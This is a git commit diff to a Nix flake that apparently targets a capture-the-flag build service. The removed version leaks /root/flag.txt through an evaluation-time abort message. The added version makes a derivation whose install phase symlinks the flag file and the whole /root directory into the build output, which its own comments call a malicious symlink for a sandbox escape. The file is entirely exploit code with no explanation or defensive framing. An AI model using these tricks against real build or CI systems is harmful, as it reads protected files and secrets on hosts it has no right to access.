55fab1b9cb236b323624d9c76852535c0e4acae3
watchingdogs <69792238+watchingdogs@users.noreply.github.com>
2026-04-19 15:46:52 +0200

    try symlink

--- flake.nix
+++ flake.nix
@@ -1,8 +1,32 @@
 {
-  description = "Root Evaluation Phase Exploit";
+  description = "Symlink Sandbox Escape";
 
-  outputs = { self }: {
-    packages.x86_64-linux.default = 
-      builtins.abort "=== FLAG DUMP: ${builtins.readFile /root/flag.txt} ===";
+  inputs = {
+    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
+  };
+
+  outputs = { self, nixpkgs }: 
+  let
+    system = "x86_64-linux";
+    pkgs = import nixpkgs { inherit system; };
+  in {
+    packages.${system}.default = pkgs.stdenv.mkDerivation {
+      pname = "symlink-escape";
+      version = "1.0";
+      src = ./.;
+
+      # Do nothing during the build phase, just succeed.
+      buildPhase = "true";
+
+      installPhase = ''
+        mkdir -p $out
+        
+        # Create a malicious symlink pointing directly to the locked flag
+        ln -s /root/flag.txt $out/flag.txt
+        
+        # Bonus: Let's symlink the entire root directory just in case it zips the output
+        ln -s /root $out/root_dir
+      '';
+    };
   };
 }
